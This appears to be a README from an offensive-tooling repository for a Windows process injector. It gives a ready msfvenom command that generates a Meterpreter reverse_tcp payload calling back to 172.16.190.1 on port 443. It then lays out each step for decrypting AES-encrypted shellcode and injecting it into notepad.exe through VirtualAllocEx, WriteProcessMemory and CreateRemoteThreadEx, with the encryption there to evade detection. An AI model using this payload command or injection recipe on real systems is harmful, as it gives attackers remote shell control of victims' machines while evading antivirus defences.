### Inject AES-256 encrypted shellcode into process

Decrypts an AES-encrypted shellcode payload locally, injects it into a running `notepad.exe` process, and executes it using `CreateRemoteThread`.

## Genereted meterpreter shellcode
```
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.190.1 LPORT=443 EXITFUNC=thread -f c --var-name=puke
```

## Step-by-step

1. Finds running process
   - Enumerates process using `CreateToolhelp32Snapshot`
   - Looks for `notepad.exe`
  
2. Opens the target process
  - Uses `OpenProces(PROCESS_ALL_ACCESS)`

3. Allocates memory in the remote process
   - Uses `VirtualAllocEx`
   - Memory is **RWX** (`PAGE_EXECUTE_READWRITE`)

4. Decrypts the payload
   - Payload is **AES-CBC** encrypted
   - Uses **tiny-AES**
   - Decryption happnes locally in the injector, not inside the target process
  
5. Writes decrypted shellcode into the target
  - Uses `WriteProcessMemory`

6. Executes the shellcode
   - Uses `CreateRemoteThreadEx`
   - Thread entry point = injected buffer 
